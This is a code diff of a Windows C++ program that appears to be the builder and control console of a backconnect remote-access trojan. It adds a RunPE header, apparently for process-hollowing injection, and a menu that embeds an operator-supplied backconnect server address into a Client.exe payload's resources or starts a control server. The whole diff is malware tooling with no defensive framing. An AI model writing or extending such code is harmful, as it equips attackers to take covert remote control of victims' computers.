@@ -2,6 +2,9 @@
 //
 #include <Windows.h>
 #include <iostream>
+#include "Runpe.h"
+#include "rawControllServer.h"
+#include <string>
 
 
 void WriteToResources(LPCSTR szTargetPE, int id, LPBYTE lpBytes, DWORD dwSize)
@@ -28,13 +31,38 @@ std::cout << R"(
 
 	Sleep(2000);
 	system("cls");
-	std::string write;
-	std::cout << "Enter your Backconnect Server: (127.0.0.1:6667)\n";
-	std::cin >> write;
+	std::cout << "What did you want to do:\n";
+	std::cout << "[1] Build New Client\n"
+		<< "[2] Start Controll Server\n";
 
-	std::cout << write << std::endl;
-	char* c_write = &write[0u];
-	std::cout << write << std::endl;
-	WriteToResources("Client.exe", 10, (BYTE*)c_write, strlen(c_write));
+	std::string input;
+	std::getline(std::cin, input);
+
+	while (true) {
+		system("cls");
+		std::cout << "What did you want to do:\n";
+		std::cout << "[1] Build New Client\n"
+			<< "[2] Start Controll Server\n";
+		std::getline(std::cin, input);
+
+		if (input == "1") {
+
+			system("cls");
+			std::string write;
+			std::cout << "Enter your Backconnect Server: (127.0.0.1)\n";
+			std::cin >> write;
+
+			std::cout << write << std::endl;
+			char* c_write = &write[0u];
+			std::cout << write << std::endl;
+			WriteToResources("Client.exe", 10, (BYTE*)c_write, strlen(c_write));
+		}
+		else if (input == "2") {
+			runBackServer(rawControllServer);
+		}
+	}
+
+
+
 }
 
